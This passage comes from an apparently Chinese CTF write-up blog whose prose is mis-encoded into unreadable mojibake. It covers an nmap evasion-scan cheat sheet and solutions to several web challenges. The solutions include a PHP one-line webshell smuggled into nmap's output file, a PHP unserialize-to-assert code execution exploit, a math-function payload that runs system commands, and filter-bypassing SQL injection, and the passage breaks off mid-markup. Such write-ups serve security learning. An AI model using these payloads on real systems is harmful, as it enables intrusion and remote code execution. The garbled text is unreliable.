192.168.0.101å¿«é€Ÿæ‰«æï¼Œä»…æ‰«ænmap-servicesæ–‡ä»¶ä¸­çš„ç«¯å£è€Œé¿å¼€æ‰€æœ‰å…¶å®ƒçš„ç«¯å£</span><br><span class="line">nmap -f 192.168.96.4ä½¿ç”¨å°æ•°æ®åŒ…å‘é€ï¼Œé¿å…è¢«è¯†åˆ«å‡º</span><br><span class="line">nmap -r 192.168.0.101ä¸ä¼šéšæœºçš„é€‰æ‹©ç«¯å£æ‰«æ</span><br><span class="line">nmap -p 80,443 192.168.0.101ä½¿ç”¨â€œ-Pâ€é€‰é¡¹æŒ‡å®šä½ æƒ³è¦æ‰«æçš„ç«¯å£</span><br><span class="line">nmap -sV 192.168.0.101æŸ¥æ‰¾ä¸»æœºæœåŠ¡ç‰ˆæœ¬å·</span><br><span class="line">nmap -PS 192.168.0.101ä½¿ç”¨TCP ACKå’ŒTCP Synæ–¹æ³•æ¥æ‰«æè¿œç¨‹ä¸»æœºï¼ˆé˜²ç«å¢™ä¼šé˜»æ–­æ ‡ICMPåŒ…ï¼‰</span><br><span class="line">nmap -Pn 192.168.96.4  ç›®æ ‡æœºç¦ç”¨pingï¼Œç»•è¿‡pingæ‰«æ</span><br><span class="line">nmap -sn 192.168.96.4å¯¹ç›®æ ‡è¿›è¡Œpingæ£€æµ‹ï¼Œä¸è¿›è¡Œç«¯å£æ‰«æï¼ˆå‘é€å››ç§æŠ¥æ–‡ç¡®å®šç›®æ ‡æ˜¯å¦å­˜æ´»ï¼‰</span><br><span class="line">nmap -sS 192.168.0.101æ‰§è¡Œä¸€æ¬¡éšè”½çš„æ‰«æï¼Œå®‰å…¨ï¼Œå¿«</span><br><span class="line">nmap -sT 192.168.0.101ä½¿ç”¨TCP Synæ‰«ææœ€å¸¸ç”¨çš„ç«¯å£ï¼Œä¸å®‰å…¨ï¼Œæ…¢</span><br><span class="line">nmap -sN 192.168.0.101æ‰§è¡ŒTCPç©ºæ‰«æä»¥éª—è¿‡é˜²ç«å¢™</span><br><span class="line">nmap -sI åƒµå°¸ip ç›®æ ‡ipä½¿ç”¨åƒµå°¸æœºå¯¹ç›®æ ‡æœºå‘é€æ•°æ®åŒ…</span><br><span class="line">nmap 192.168.96.4 -oX myscan.xmlå¯¹æ‰«æç»“æœå¦å­˜åœ¨myscan.xml</span><br><span class="line">nmap -T1~6 192.168.96.4è®¾ç½®æ‰«æé€Ÿåº¦ï¼Œä¸€èˆ¬T4è¶³å¤Ÿ</span><br><span class="line">nmap â€“mtu &lt;size&gt; 192.168.96.4å‘é€çš„åŒ…å¤§å°,æœ€å¤§ä¼ è¾“å•å…ƒå¿…é¡»æ˜¯8çš„æ•´æ•°</span><br><span class="line">nmap -D &lt;å‡ip&gt; 192.168.96.4å‘é€å‚æ‚ç€å‡ipçš„æ•°æ®åŒ…æ£€æµ‹</span><br><span class="line">ç»§ç»­ä¸­æ–­æ‰«æï¼š</span><br><span class="line">nmap â€“oG 1.txt â€“v 192.168.1.1/24-oGå°†æ‰«æç»“æœä¿å­˜ä¸ºTXTï¼ŒCtrl+Cä¸­æ–­æ‰«æ</span><br><span class="line">Nmap â€“resume 1.txtä½œç”¨ï¼šç»§ç»­æ‰«æ</span><br></pre></td></tr></table></figure><p>çœ‹äº†å¾ˆå¤šèµ„æ–™åï¼ŒçŸ¥é“äº†ï¼Œnmapå¯ä»¥å°†æ‰«æåçš„ç»“æœä¿å­˜ä¸ºæ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶æ ¼å¼ç”šè‡³å¯ä»¥è‡ªå·±å†³å®šï¼Œé‚£å²‚ä¸æ˜¯å¯ä»¥ç›´æ¥å°è¯•å†™ä¸€å¥è¯æœ¨é©¬äº†ã€‚ã€‚ã€‚ã€‚</p><p>æŠŠnmapä¿å­˜æ–‡ä»¶çš„ä¸€äº›æ–¹æ³•æˆªä¸‹æ¥ï¼š</p><p><img src="../images/image-20230408213113606.png" alt="image-20230408213113606"></p><p>æœ¬åœ°æµ‹è¯•äº†ä¸€äº›ï¼Œnmapä¿å­˜æ–‡ä»¶çš„æ–¹æ³•</p><p>çœŸåˆ‘å•Šï¼Œæ–‡ä»¶çš„åç¼€å¯ä»¥è‡ªå·±å†³å®šï¼Œæ–‡ä»¶å†…å®¹é‡Œè¿˜åŒ…å«äº†æˆ‘ä»¬è¾“å…¥çš„æŸ¥è¯¢å†…å®¹ã€‚</p><p>å›åˆ°é¢˜ç›®ï¼Œä¹‹å‰æˆ‘ä»¬çŒœæµ‹äº†nmap 127.0.0.1 -oX ./xml/????</p><p>å…¶ä¸­127.0.0.1æ˜¯æˆ‘ä»¬æ§åˆ¶çš„ï¼Œé‚£æˆ‘ä»¬å°è¯•æ”¹æˆ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&lt;?php eval($_POST[&quot;pwd&quot;]);?&gt; -oG 1.php&#x27;</span></span><br></pre></td></tr></table></figure><p>æµ‹è¯•åå‘ç°è¢«æ‹¦æˆªäº†ï¼Œå¯èƒ½æ˜¯PHPå…³é”®å­—è¢«æ‹¦æˆªäº†ï¼Œä¹Ÿå¯èƒ½æ˜¯oGè¢«ç¦ç”¨äº†ï¼Œå…ˆè¯•ç€ç»•phpï¼Œåç¼€å¯ä»¥å°†phpæ”¹æˆphtml</p><p>æ–‡ä»¶çš„å†…å®¹&lt;?phpä¸­çš„PHPå¦‚ä½•æ›¿æ¢ä¸Šç½‘å»æŸ¥äº†ä¸€ä¸‹ï¼Œè§£å†³æ–¹æ³•æ˜¯ä½¿ç”¨çŸ­æ ‡ç­¾&lt;?=</p><p>æœ€ç»ˆpayloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; &lt;?= @eval($_POST[&quot;pwd&quot;]);?&gt; -oG 1.phtml &#x27;</span></span><br></pre></td></tr></table></figure><p>è¿›è¡Œäº†escapeshellarg()ä¸escapeshellcmd()å‡½æ•°å¤„ç†ä¿æŠ¤ï¼Œæ²¡æ³•äº§ç”Ÿæ–‡ä»¶</p><p>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆè¦åŠ å¼•å·çš„åŸå› </p><p>è¿™å’Œä¹‹å‰çš„ä¸€é¢˜æœ‰ç‚¹åƒ </p><h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230408213950745.png" alt="image-20230408213950745"></p><p>æŸ¥çœ‹æºç å‘ç°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">enc</span>(<span class="params">code</span>)&#123;</span><br><span class="line">  hash = <span class="title function_">hex_md5</span>(code);</span><br><span class="line">  <span class="keyword">return</span> hash;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">validate</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> code = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;vcode&quot;</span>).<span class="property">value</span>;</span><br><span class="line">  <span class="keyword">if</span> (code != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_">hex_md5</span>(code) == <span class="string">&quot;0cd4da0223c0b280829dc3ea458d655c&quot;</span>)&#123;</span><br><span class="line">      <span class="title function_">alert</span>(<span class="string">&quot;æ‚¨é€šè¿‡äº†éªŒè¯ï¼&quot;</span>);</span><br><span class="line">      <span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&quot;./flag.php&quot;</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="title function_">alert</span>(<span class="string">&quot;ä½ çš„æˆæƒç ä¸æ­£ç¡®ï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;è¯·è¾“å…¥æˆæƒç &quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå°±ç›´æ¥å»è®¿é—®flag.php</p><p><img src="../images/image-20230408214236511.png" alt="image-20230408214236511"></p><p>è¿™ä¸¤ç‚¹è¿›è¡Œäº†æç¤º</p><p><img src="../images/image-20230408214359417.png" alt="image-20230408214359417"></p><p>æœ€åæ‹¿åˆ°äº†flag</p><h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230408214513042.png" alt="image-20230408214513042"></p><p><img src="../images/image-20230408214635383.png" alt="image-20230408214635383"></p><p>å‘ç°äº†é¢˜ç›®ç»™çš„ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">HelloPhp</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="variable">$ppp</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">2023</span>-<span class="number">04</span>-<span class="number">08</span> <span class="number">01</span>:<span class="number">46</span>:<span class="number">38</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¯ç›´æ¥æ„é€ system(xxxx)çš„è¯æ˜¯ä¸è¡Œçš„ï¼Œå› ä¸ºsystemè¢«è¿‡æ»¤äº†</p><p>é¦–å…ˆè¿™é‡Œéœ€è¦åˆ©ç”¨<a href="https://so.csdn.net/so/search?q=assert&amp;spm=1001.2101.3001.7020">assert</a>å‡½æ•°ï¼Œassertä¼šåˆ¤æ–­åº”è¯¥è¡¨è¾¾å¼æ˜¯å¦æˆç«‹ï¼Œè¿”å›trueæˆ–falseï¼Œis_numericå‡½æ•°å°†æ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ï¼Œä»£ç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;123&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">assert</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230408215138117.png" alt="image-20230408215138117"></p><p>phpinfo(true)   æˆ–è€…   phpinfo(1)  éƒ½æ˜¯å¯ä»¥ç›´æ¥æ‰§è¡Œçš„    è¿˜æœ‰ä¸€ä¸ªå°çŸ¥è¯†ç‚¹  phpinfo() æ‰§è¡Œæ˜¯ä¼šè¿”å›1çš„   ä¹Ÿå°±æ˜¯true</p><p><img src="../images/image-20230408215820893.png" alt="image-20230408215820893"></p><p>ä¹Ÿæ˜¯ä¼šæ‰§è¡Œçš„</p><p><strong>exp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;phpinfo()&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">HelloPhp</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//if(isset($_GET[&#x27;source&#x27;]))&#123;highlight_file(__FILE__);die(0);&#125;@$ppp = unserialize($_GET[&quot;data&quot;]); </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="CISCN-2019-åˆèµ›-Love-Math"><a href="#CISCN-2019-åˆèµ›-Love-Math" class="headerlink" title="[CISCN 2019 åˆèµ›]Love Math"></a>[CISCN 2019 åˆèµ›]Love Math</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//ä¾‹å­ c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå’Œctfshowé‡Œé¢çš„ä¸€é“é¢˜å‡ ä¹ä¸€æ¨¡ä¸€æ ·ï¼Œå°±æ˜¯è€ƒæŸ¥åˆ©ç”¨å‡½æ•°çš„è½¬åŒ–æ¥è¿›è¡Œåšé¢˜</p><p><strong>å°±æ˜¯ä½¿ç”¨GETé€ƒé€¸æ¥è¿›è¡Œåšé¢˜</strong></p><p>80ä¸ªå­—ç¬¦æ¯”è¾ƒå°‘ï¼Œæƒ³åŠæ³•æ„é€ <script type="math/tex">_GET[1]`å†ä¼ å‚getflagï¼Œä½†æ˜¯å…¶å®å‘ç°æ„é€ è¿™ä¸ªå¥½åƒæ›´éš¾ã€‚ã€‚ã€‚å› ä¸º`</script>ã€<code>_</code>ã€<code>[</code>ã€<code>]</code>éƒ½ä¸èƒ½ç”¨ï¼ŒåŒæ—¶<code>GET</code>å¿…é¡»æ˜¯å¤§å†™ï¼Œå¾ˆéš¾ç›´æ¥æ„é€ ã€‚</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pi</span>=<span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>));(<span class="variable">$$pi</span>)&#123;pi&#125;((<span class="variable">$$pi</span>)&#123;abs&#125;)&amp;pi=system&amp;abs=tac flag.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">base_convert(37907361743,10,36) =&gt; &quot;hex2bin&quot; </span><br><span class="line">dechex(1598506324) =&gt; &quot;5f474554&quot; </span><br><span class="line">$pi=hex2bin(&quot;5f474554&quot;) =&gt; $pi=&quot;_GET&quot;   //hex2binå°†ä¸€ä¸²16è¿›åˆ¶æ•°è½¬æ¢ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸² </span><br><span class="line">($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;) =&gt; ($_GET)&#123;pi&#125;($_GET)&#123;abs&#125;  //&#123;&#125;å¯ä»¥ä»£æ›¿[]</span><br></pre></td></tr></table></figure><p><a href="https://johnfrod.top/ctf/%E5%88%A9%E7%94%A8%E6%95%B0%E5%AD%A6%E5%87%BD%E6%95%B0%E6%9E%84%E9%80%A0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">å››ç§æ–¹æ³•</a></p><h2 id="SWPU2019-Web1-sqlæ³¨å…¥"><a href="#SWPU2019-Web1-sqlæ³¨å…¥" class="headerlink" title="[SWPU2019]Web1(sqlæ³¨å…¥)"></a>[SWPU2019]Web1(sqlæ³¨å…¥)</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230410164651863.png" alt="image-20230410164651863"></p><p>ä¸€ä¸ªç™»å½•æ¡†</p><p>è¿™é‡Œå°è¯•è¿›è¡Œæ³¨å†Œåï¼Œå‘ç°adminç”¨æˆ·å·²ç»å­˜åœ¨ï¼Œæ‰€ä»¥å°±å°è¯•è‡ªå·±æ³¨å†Œä¸€ä¸ªè´¦å·è¿›è¡Œç™»å½•</p><p><img src="../images/image-20230410164906595.png" alt="image-20230410164906595"></p><p>ç™»å½•ç•Œé¢</p><p>ç”¨ä¸‡èƒ½å¯†ç è¿›è¡Œæµ‹è¯•çš„æ—¶å€™å‘ç°</p><p><img src="../images/image-20230410165107656.png" alt="image-20230410165107656"></p><p>fuzzæµ‹è¯•ç»“æœ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ç©ºæ ¼è¢«æ›¿æ¢ä¸ºç©º</span><br><span class="line">or</span><br><span class="line">and</span><br><span class="line">join</span><br><span class="line">--+</span><br><span class="line">#</span><br><span class="line">updatexml</span><br><span class="line">extractvalue</span><br><span class="line">exp</span><br><span class="line">floor</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ä¸èƒ½ç”¨æ³¨é‡Šä¹‹åï¼Œæˆ‘ä»¬å°±å°è¯•è¿›è¡Œé—­åˆ</p><p><img src="../images/image-20230410165855329.png" alt="image-20230410165855329"></p><p>å…ˆéœ€è¦åˆ¤æ–­æœ‰å¤šå°‘å­—æ®µï¼Œ<code>order by</code>ä¸èƒ½ä½¿ç”¨ï¼Œå¯ä»¥ä½¿ç”¨<code>group by</code>æˆ–è€…<code>into @a, @b, @c, ...</code></p><p>å‘å¸ƒå¹¿å‘Šï¼ˆâ€™ or 1=1ï¼‰è¿›è¡Œå°è¯•ï¼Œè¿›è¡Œæµ‹è¯•æ—¶å‘ç°ç©ºæ ¼ã€orã€#ã€â€”+ã€andç­‰è¿›è¡Œäº†è¿‡æ»¤ï¼Œç›®å‰åŸºæœ¬å¯ä»¥ç¡®å®šæ³¨å…¥ç‚¹åœ¨è¿™ä¸ªåœ°æ–¹ï¼Œåœ¨è¿›è¡Œæ³¨å…¥çš„æ—¶å€™æˆ‘ä»¬éœ€è¦å…ˆåˆ¤æ–­åˆ—æ•°ï¼Œpayloadï¼š1â€™/<strong>/group/</strong>/by/**/n,â€™ï¼Œnä¸ºæ•´æ•°ï¼ˆå› ä¸ºå¯¹orè¿›è¡Œäº†è¿‡æ»¤ï¼Œå¯¼è‡´orderæ— æ³•ä½¿ç”¨ï¼Œå› æ­¤è¿™é‡Œæ‰é‡‡ç”¨group byæ¥ç¡®å®šåˆ—æ•°ï¼‰ï¼Œæœ€ç»ˆå¾—åˆ°nä¸º22ï¼Œç»“æœå¦‚ä¸‹ï¼š</p><p><img src="../images/image-20230410170426061.png" alt="image-20230410170426061"></p><p>å‘ç°ä¸€å…±æœ‰23åˆ—ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å°è¯•ä¸€ä¸‹çœ‹å“ªæœ‰å›æ˜¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 